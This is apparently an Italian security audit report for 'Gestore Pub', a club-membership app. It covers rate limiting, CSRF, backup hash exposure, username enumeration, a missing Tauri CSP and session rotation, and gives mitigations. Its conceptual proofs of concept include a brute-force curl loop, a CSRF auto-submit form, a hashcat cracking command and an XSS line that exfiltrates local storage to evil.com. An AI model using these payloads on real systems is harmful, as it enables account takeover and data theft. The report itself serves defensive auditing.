# Security Audit Report - Gestore Pub

**Data Analisi:** 2026-06-15  
**Versione Applicazione:** 1.0.10  
**Tipologia:** Applicazione locale per gestione soci e presenze (Club Privato)  
**Stack Tecnologico:** React 19, TanStack Start, Prisma ORM, SQLite, Tauri 2 (Desktop)  
**Ambiente:** Single-page application con backend integrato (Server Functions), deployabile come web app o app desktop Tauri

**Stato mitigazioni (2026-06-15):** le vulnerabilità principali sono state indirizzate nel codice:
- rate limiting login/recupero persistente su SQLite tramite `RateLimitAttempt`;
- protezione CSRF globale per richieste non-GET con controllo `Origin`/`Sec-Fetch-Site`;
- backup standard senza hash password/frase recupero, con backup completo separato lato server;
- percorsi login/recupero uniformati contro username enumeration;
- CSP Tauri abilitata;
- DevTools limitati alla modalità `serve`;
- rotazione sessioni su login, cambio password e cambio frase recupero.

---

## 1. Executive Summary

L'applicazione **Gestore Pub** presenta un **livello di sicurezza complessivamente BUONO** per un'applicazione locale di gestione club, con un'architettura moderna basata su TanStack Start che separa chiaramente codice client/server. L'uso di Prisma ORM mitiga efficacemente i rischi di SQL Injection, l'autenticazione utilizza PBKDF2-SHA512 con 310.000 iterazioni (superiore alle raccomandazioni OWASP), e i cookie di sessione sono configurati correttamente (HttpOnly, Secure, SameSite=Strict).

Tuttavia, sono state identificate **4 vulnerabilità di severità Media**, **3 di severità Bassa** e diverse aree di miglioramento che richiedono attenzione prima di un deployment in produzione, in particolare per la gestione del rate limiting in-memory, l'assenza di protezione CSRF, l'esposizione di hash sensibili nei backup, e la mancanza di Content Security Policy nell'app Tauri.

**Rischio Residuo Stimato:** **MEDIO-ALTO** per deployment web esposto su rete; **BASSO-MEDIO** per uso esclusivamente locale/desktop (Tauri).

---

## 2. Vulnerabilità Identificate

### 2.1 [MEDIA] Rate Limiting In-Memory Non Persistente né Distribuito

**File:** `src/lib/api.functions.ts` (righe 160-220)

**Descrizione:**  
Il rate limiting per login (`loginAttempts` Map) e recupero password (`recoveryAttempts` Map) è implementato usando `Map` in-memory del processo Node.js. Questo presenta tre problemi critici:
1. **Non persistente:** Riavviando il server si azzerano i contatori, permettendo attacchi di brute-force illimitati.
2. **Non distribuito:** In deployment multi-istanza (es. dietro load balancer), ogni istanza ha il proprio contatore, vanificando la protezione.
3. **Memory exhaustion:** Un attaccante può generare milioni di entry uniche (username casuali) causando DoS per esaurimento memoria.

**Scenario di Attacco (PoC Concettuale):**
```bash
# Attacco brute-force distribuito su più istanze
for i in {1..1000}; do
  curl -X POST https://app/login -d '{"username":"admin","password":"wrong'$i'"}' &
done
# Ogni istanza vede solo una frazione dei tentativi
# Riavvio del server azzera tutto: systemctl restart app
```

**Mitigazione:**
```typescript
// Usare Redis con sliding window log o token bucket
// Esempio con ioredis (da aggiungere come dipendenza)
import Redis from 'ioredis';
const redis = new Redis(process.env.REDIS_URL);

async function assertLoginAllowed(username: string) {
  const key = `ratelimit:login:${username.toLowerCase()}`;
  const current = await redis.incr(key);
  if (current === 1) await redis.expire(key, 15 * 60); // 15 min window
  if (current > 8) {
    const ttl = await redis.ttl(key);
    throw new Error(`Troppi tentativi. Riprova tra ${ttl} secondi.`);
  }
}
```

---

### 2.2 [MEDIA] Assenza Protezione CSRF per Server Functions

**File:** `src/lib/api.functions.ts` (tutte le `createServerFn`)

**Descrizione:**  
TanStack Start `createServerFn` non include protezione CSRF built-in per le mutazioni (POST). Le funzioni sensibili (`createMemberFn`, `deleteMemberFn`, `renewMembershipFn`, `registerAttendanceFn`, `changeAdminPasswordFn`, `restoreBackupFn`, ecc.) sono vulnerabili ad attacchi Cross-Site Request Forgery se l'applicazione viene deployata su web e un utente admin visita un sito malevolo.

**Scenario di Attacco (PoC Concettuale):**
```html
<!-- Sito malevolo visitato da admin autenticato -->
<form action="https://club-app.com/api/createMemberFn" method="POST" id="exploit">
  <input name="data" value='{"first_name":"Attacker","last_name":"User","member_number":"HACKED","start_date":"2025-01-01"}' />
</form>
<script>document.getElementById('exploit').submit();</script>
```

**Mitigazione:**
```typescript
// Aggiungere middleware CSRF globale in src/start.ts
import { createMiddleware } from '@tanstack/react-start';

export const csrfMiddleware = createMiddleware({ type: 'function' })
  .server(async ({ next }) => {
    const origin = getRequestHeader('origin');
    const host = getRequestHeader('host');
    if (origin && new URL(origin).host !== host) {
      throw new Error('CSRF: Origin mismatch');
    }
    return next();
  });

// Oppure usare double-submit cookie pattern con token per-request
```

---

### 2.3 [MEDIA] Esposizione Hash Password e Recovery Phrase nei Backup

**File:** `src/lib/api.functions.ts` (funzione `exportBackupFn`, righe 1150-1250)

**Descrizione:**  
La funzione `exportBackupFn` esporta **tutti gli hash password** (`member.password`) e **tutti gli hash delle frasi di recupero** (`member.recovery_phrase_hash`) nel file JSON di backup, insieme ai token QR. Sebbene siano hash (non plaintext), questo viola il principio di *minimizzazione dei dati* e espone credenziali a:
- Attacchi offline di password cracking (se backup rubato)
- Rainbow table / dictionary attacks su hash PBKDF2
- Riutilizzo credenziali su altri sistemi (credential stuffing)

**Scenario di Attacco (PoC Concettuale):**
```bash
# Admin scarica backup su USB non cifrata -> USB persa
# Attaccante estrae hash e lancia hashcat:
hashcat -m 12100 -a 0 hashes.txt rockyou.txt  # PBKDF2-SHA512
# Con 310k iterazioni: ~500 H/s su GPU moderna -> settimane per password deboli
```

**Mitigazione:**
```typescript
// Escludere campi sensibili dal backup standard
const backup = {
  // ...existing code...
  data: {
    members: members.map((member) => ({
      // ...existing code...
      // RIMUOVERE: password, recovery_phrase_hash, qr_token
      // password: member.password,        // <-- REMOVE
      // recovery_phrase_hash: member.recovery_phrase_hash,  // <-- REMOVE
      // qr_token: member.qr_token,       // <-- REMOVE (o opzionale)
      // AGGIUNGERE: flag per indicare se recovery phrase è impostata
      has_recovery_phrase: Boolean(member.recovery_phrase_hash),
    })),
    // ...
  },
};

// Creare funzione separata "exportFullBackup" solo per migrazione admin-esperto
// con warning esplicito e cifratura opzionale (es. age/GPG)
```

---

### 2.4 [MEDIA] Username Enumeration via Messaggi Errore Differenziati

**File:** `src/lib/api.functions.ts` (funzioni `loginFn` righe 650-690, `recoverPasswordFn` righe 580-640)

**Descrizione:**  
I messaggi di errore differenziano tra "utente inesistente" e "password errata":
- Login: `recordLoginFailure` chiamato solo se utente esiste → messaggio generico "Credenziali non valide" ma **timing attack** possibile
- Recovery: `recordRecoveryFailure` chiamato prima di verificare esistenza utente → **stesso messaggio** ma logica diversa

In `recoverPasswordFn`: se utente non esiste, usa `DUMMY_PASSWORD_HASH` per verificare la recovery phrase (costante tempo), ma **chiama `recordRecoveryFailure`** rivelando che l'username è stato processato.

**Scenario di Attacco (PoC Concettuale):**
```bash
# Enumerazione utenti via timing/recovery
for user in $(cat userlist.txt); do
  time curl -X POST /api/recoverPasswordFn -d "{\"username\":\"$user\",\"recovery_phrase\":\"wrong\",\"new_password\":\"NewPass123!\"}"
  # Analisi tempi risposta o rate limit per scoprire utenti validi
done
```

**Mitigazione:**
```typescript
// Unificare completamente i percorsi: SEMPRE stessa logica, stesso timing
export const loginFn = createServerFn({ method: 'POST' })
  .handler(async ({ data }) => {
    const searchUsername = data.username.trim().toLowerCase();
    
    // SEMPRE verifica rate limit PRIMA di query DB
    await assertLoginAllowed(searchUsername);  // Usa chiave costante per utenti inesistenti
    
    const member = await prisma.member.findUnique({
      where: { username: searchUsername },
      select: { id: true, password: true, password_changed: true, must_setup: true },
    });

    // SEMPRE verifica password (anche con dummy hash) - constant time
    const passwordHash = member?.password ?? DUMMY_PASSWORD_HASH;
    const isValid = verifyPassword(data.password, passwordHash);

    if (!member || !isValid) {
      await recordLoginFailure(searchUsername);  // SEMPRE chiamato
      throw new Error('Credenziali non valide');  // Messaggio IDENTICO
    }
    // ...
  });
```

---

### 2.5 [BASSA] Content Security Policy Assente in Tauri

**File:** `src-tauri/tauri.conf.json` (riga 18: `"csp": null`)

**Descrizione:**  
L'applicazione Tauri disabilita completamente la CSP (`null`). In caso di XSS (es. via QR code malevolo, import backup corrotto, o future feature), l'attaccante può eseguire JavaScript arbitrario nel contesto dell'app desktop con accesso alle API Tauri (filesystem, shell, ecc.).

**Scenario di Attacco (PoC Concettuale):**
```javascript
// QR code contenente: javascript:fetch('http://evil.com/steal?data='+localStorage.getItem('gestore-pub:desktop-db'))
// Se scanner usa eval() o innerHTML non sanificato -> XSS -> RCE via Tauri API
```

**Mitigazione:**
```json
// tauri.conf.json
"app": {
  "security": {
    "csp": "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; connect-src 'self'; font-src 'self'; object-src 'none'; base-uri 'none'; form-action 'self'; frame-ancestors 'none';"
  }
}
```

---

### 2.6 [BASSA] Mancanza Rotazione Sessione su Cambio Privilegi

**File:** `src/lib/auth.server.ts` (funzione `setSession`, `getAuthenticatedUser`)

**Descrizione:**  
Quando un admin cambia password (`changeAdminPasswordFn`) o recovery phrase, le sessioni esistenti vengono revocate correttamente. Tuttavia, **non c'è rotazione della sessione su cambio ruolo** (es. se in futuro si aggiungesse promozione utente→admin). Inoltre, il token di sessione non viene rigenerato dopo login riuscito (session fixation teorico, basso rischio per app locale).

**Mitigazione:**
```typescript
// In changeAdminPasswordFn, changeAdminRecoveryPhraseFn, setupValidator:
// Già presente: revoca sessioni vecchie + setSession nuovo -> OK

// Aggiungere in futuro per cambio ruolo:
export const promoteUserFn = createServerFn({ method: 'POST' })
  .handler(async ({ data }) => {
    // ... logica promozione ...
    // FORZARE nuova sessione:
    await prisma.session.updateMany({
      where: { memberId: userId, revokedAt: null },
      data: { revokedAt: new Date() },
    });
    await setSession(userId);  // Nuovo token
  });
```

---

### 2.7 [BASSA] DevTools TanStack Inclusi in Build di Produzione (Rischio Information Disclosure)

**File:** `vite.config.ts` (riga 12: `devtools()` sempre attivo), `package.json` (devDependencies)

**Descrizione:**  
Il plugin `@tanstack/devtools-vite` è registrato **incondizionatamente** nel config Vite. Anche se la documentazione TanStack indica che `removeDevtoolsOnBuild` dovrebbe rimuoverlo in produzione, il plugin è caricato sempre. In build di produzione, questo potrebbe:
- Aumentare bundle size inutilmente
- Esporre route tree, loader data, mutation state se non strippato correttamente
- Lasciare codice di debugging in produzione

**Verifica necessaria:** Controllare `dist/client` build di produzione per assenza codice devtools.

**Mitigazione:**
```typescript
// vite.config.ts
plugins: [
  // Solo in development
  process.env.NODE_ENV === 'development' && devtools(),
  // ...
].filter(Boolean),
```

---

## 3. Analisi della Superficie d'Attacco e Architettura

### 3.1 Endpoint/API Più Critici (Richiedono Monitoraggio Prioritario)

| Endpoint / Funzione | Rischio | Motivo |
|---------------------|---------|--------|
| `loginFn` | **ALTO** | Entry point autenticazione, brute-force target |
| `recoverPasswordFn` | **ALTO** | Account takeover via recovery phrase, enum utenti |
| `setupValidator` | **ALTO** | Impostazione credenziali iniziali admin, esposto post-login |
| `restoreBackupFn` | **ALTO** | Sovrascrive intero DB, esegue come admin, accetta input utente |
| `createMemberFn` | **MEDIO** | Crea account con password nota (ritornata in response!) |
| `exportBackupFn` | **MEDIO** | Esfiltrazione massiva dati sensibili (hash, QR token) |
| `registerAttendanceFn` | **BASSO** | Input `member_id`/`qr_token` validato ma no rate limit |

### 3.2 Componenti Architetturali a Rischio

1. **Server Functions (TanStack Start):** Boundary client/server - tutte le mutazioni passano qui. Punto singolo di controllo ma anche singolo punto di fallimento.
2. **Prisma ORM:** Mitiga SQLi ma attenzione a `prisma.$queryRaw` (non usato nel codice analizzato - **OK**).
3. **Cookie di Sessione:** Unico meccanismo auth - **nessun header Authorization/Bearer token** (buono per CSRF, ma limita API programmatiche).
4. **Tauri IPC:** `desktop-api.ts` espone funzioni al frontend - verificare `allowlist` in `tauri.conf.json` (non presente nel config analizzato).
5. **File System Access (Tauri):** `saveTextFile`/`savePdfDocument` usano File System Access API - richiede permesso utente, **OK**.

### 3.3 Flusso Dati Sensibili

```
┌─────────────┐     ┌──────────────────┐     ┌─────────────┐
│   Browser   │────▶│  Server Functions │────▶│   SQLite    │
│  (Client)   │     │  (API Functions) │     │  (Prisma)   │
└─────────────┘     └──────────────────┘     └─────────────┘
       │                    │                        │
       │              ┌─────┴─────┐                  │
       │              ▼           ▼                  │
       │         Auth Logic   Rate Limit             │
       │         (PBKDF2)     (In-Memory Map)        │
       │              │           │                  │
       ▼              ▼           ▼                  ▼
┌─────────────┐  ┌──────────┐ ┌────────┐      ┌──────────┐
│ localStorage│  │ Cookies  │ │ Memory │      │  Backup  │
│ (Desktop)   │  │ (Session)│ │ (RateL)│      │  (JSON)  │
└─────────────┘  └──────────┘ └────────┘      └──────────┘
                                                    │
                                            ┌───────┴───────┐
                                            ▼               ▼
                                      Password Hash    Recovery Hash
                                      (PBKDF2)         (PBKDF2)
```

---

## 4. Best Practice di Sicurezza Consigliate

### 4.1 Ciclo di Vita Sviluppo (SDLC)

| Fase | Raccomandazione | Priorità |
|------|-----------------|----------|
| **Development** | Abilitare `strict: true` in `tsconfig.json` (già presente) | ✅ Fatto |
| **Development** | Aggiungere `eslint-plugin-security` e regole `no-eval`, `no-unsanitized` | 🔴 Alta |
| **Pre-commit** | Husky + `lint-staged` per ESLint, Prettier, `npm audit` | 🟡 Media |
| **CI/CD** | GitHub Actions: `npm audit --audit-level=high`, `snyk test`, build test | 🔴 Alta |
| **CI/CD** | Dependency review action per PR (`github/dependency-review-action`) | 🟡 Media |
| **Release** | Firmare build Tauri (code signing Windows/macOS) | 🔴 Alta |
| **Release** | SBOM generazione (`@cyclonedx/bom`) per supply chain | 🟢 Bassa |

### 4.2 Hardening Configurazione

```typescript
// 1. vite.config.ts - Hardening build
export default defineConfig({
  build: {
    sourcemap: false,  // Mai sourcemap in produzione
    minify: 'esbuild',
    rollupOptions: {
      output: {
        // Rimuovere commenti e console.log
        generatedCode: { constBindings: true },
      },
    },
  },
  // 2. Headers sicurezza (via TanStack Start middleware o nginx)
  server: {
    headers: {
      'X-Content-Type-Options': 'nosniff',
      'X-Frame-Options': 'DENY',
      'Referrer-Policy': 'strict-origin-when-cross-origin',
      'Permissions-Policy': 'camera=(), microphone=(), geolocation=()',
    },
  },
});
```

```json
// 3. tauri.conf.json - CSP e allowlist minimi
{
  "app": {
    "security": {
      "csp": "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; connect-src 'self'; font-src 'self'; object-src 'none'; base-uri 'none'; frame-ancestors 'none';"
    }
  },
  "allowlist": {
    "all": false,
    "fs": {
      "all": false,
      "readFile": true,
      "writeFile": true,
      "createDir": true,
      "removeFile": true
    },
    "dialog": {
      "all": false,
      "open": true,
      "save": true
    },
    "shell": {
      "all": false,
      "open": true
    }
  }
}
```

### 4.3 Miglioramenti Codice Specifici

| Area | Azione | File |
|------|--------|------|
| **Rate Limiting** | Migrare a Redis/Upstash o SQLite-based persistent store | `api.functions.ts` |
| **CSRF** | Implementare double-submit cookie o Origin check middleware | `src/start.ts` (nuovo) |
| **Backup** | Separare backup "standard" (no segreti) da "full" (cifrato, solo admin) | `api.functions.ts` |
| **Enum Utenti** | Unificare messaggi errore e timing in login/recovery | `api.functions.ts` |
| **Sessioni** | Aggiungere `sessionId` in cookie + tabella sessioni con user-agent/IP | `auth.server.ts` |
| **Password Policy** | Aggiungere controllo HaveIBeenPwned (k-anonymity) su setup/password change | `api.functions.ts` |
| **Audit Log** | Loggare azioni admin (create/delete/renew/backup/restore) in tabella dedicata | Nuovo modello Prisma |
| **QR Token** | Ruotare QR token su rinnovo tessera (attualmente statico a vita) | `renewMembershipFn` |

### 4.4 Dipendenze e Supply Chain

```bash
# Comandi da integrare in CI
npm audit --audit-level=high --omit=dev
npx @cyclonedx/bom . --output sbom.xml
# Verificare: @tanstack/devtools-vite SOLO in devDependencies ✅
# Verificare: Nessuna dipendenza con CVE noto (al 2025-06-15: tutte OK)
```

**Dipendenze da monitorare:**
- `@tanstack/react-start` v1.168.x → verificare changelog per fix sicurezza
- `prisma` v6.19.x → aggiornare regolarmente (engine binary)
- `@yudiel/react-qr-scanner` → input da camera, validare sanitizzazione output

### 4.5 Testing Sicurezza

```typescript
// Aggiungere test di sicurezza in vitest
// tests/security.test.ts
import { describe, it, expect } from 'vitest';
import { verifyPassword, hashPassword } from './src/lib/auth.server';

describe('Security: Password Hashing', () => {
  it('should use PBKDF2-SHA512 with 310k iterations', () => {
    const hash = hashPassword('TestPass123!');
    expect(hash).toMatch(/^pbkdf2_sha512\$310000\$/);
  });

  it('should be timing-safe', () => {
    // Verificare che verifyPassword usa crypto.timingSafeEqual
  });
});

describe('Security: Rate Limiting', () => {
  it('should block after 8 failed attempts', async () => {
    // Test integrazione con Redis mock
  });
});

describe('Security: Backup', () => {
  it('should NOT export password hashes in standard backup', () => {
    const backup = await exportBackupFn();
    expect(backup.backup.data.members[0]).not.toHaveProperty('password');
    expect(backup.backup.data.members[0]).not.toHaveProperty('recovery_phrase_hash');
  });
});
```

### 4.6 Incident Response Plan (Minimo per App Locale)

1. **Compromissione Backup:** Ruotare tutte le password → `changeAdminPasswordFn` + notificare utenti reset password
2. **Session Hijacking:** `DELETE FROM sessions` via Prisma studio → forza re-login tutti
3. **SQLite Corruption:** Ripristino da backup più recente → verificare integrità `PRAGMA integrity_check`
4. **QR Token Leak:** Rigenerare token per membri affetti → `UPDATE member SET qr_token = ...`

---

## Allegato A: Checklist Rapida Pre-Deploy

- [ ] Rate limiting persistente (Redis/SQLite) implementato
- [ ] CSRF protection su tutte le mutazioni POST
- [ ] Backup standard non include password/recovery hash
- [ ] Messaggi errore login/recovery unificati (no enum)
- [ ] CSP configurato in `tauri.conf.json`
- [ ] DevTools rimossi da build produzione
- [ ] Headers sicurezza (HSTS, X-Frame-Options, etc.) configurati
- [ ] Audit logging per azioni admin
- [ ] Code signing certificati Tauri configurati
- [ ] `npm audit` clean in CI
- [ ] Test sicurezza (rate limit, auth bypass, backup restore) in CI

---

## Allegato B: Riferimenti Normativi

- **OWASP Top 10 2021:** A01 Broken Access Control, A02 Cryptographic Failures, A03 Injection, A07 Identification & Authentication Failures
- **OWASP ASVS 4.0:** V2 Authentication, V3 Session Management, V5 Validation, V7 Error Handling, V12 API Security
- **NIST SP 800-63B:** Digital Identity Guidelines (Password Verifiers, Rate Limiting)
- **GDPR Art. 32:** Security of processing (minimizzazione dati backup, cifratura)

---

*Report generato da analisi statica del codice (SAST) e revisione architetturale. Non include test dinamici (DAST) o penetration testing. Si raccomanda test di penetrazione manuale pre-go-live per deployment web pubblico.*
